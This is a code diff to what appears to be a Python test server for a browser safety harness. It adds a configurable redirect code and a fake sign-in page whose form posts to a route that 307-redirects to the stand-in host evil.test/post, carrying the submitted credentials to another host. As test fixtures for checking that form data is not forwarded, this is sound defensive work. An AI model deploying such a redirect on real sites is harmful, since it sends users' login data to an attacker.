@@ -81,9 +81,9 @@ def _udp_canary(log: Log) -> socket.socket:
     return u
 
 
-def _redirect(to: str):
+def _redirect(to: str, code: int = 302):
     def go(h):
-        h.send_response(302)
+        h.send_response(code)
         h.send_header("Location", to)
         h.send_header("Content-Length", "0")
         h.end_headers()
@@ -195,6 +195,9 @@ setTimeout(() => {{ const w = new Worker(URL.createObjectURL(new Blob(
                 "/hostile": hostile,
                 "/redir": _redirect("http://evil.test/redirected"),
                 "/post": "posted",
+                # take over (owner pick A): a sign-in whose send the site hands on, data and all, to another host
+                "/signin307": SIGNIN.replace('action="/post"', 'action="/post307"'),
+                "/post307": _redirect("http://evil.test/post", 307),
                 "/opener": "<html><head><title>Opener</title></head><body><h1>Opener</h1>"
                 "<script>setTimeout(() => { alert('Hello from the page'); window.open('/'); }, 300)</script>"
                 "</body></html>",
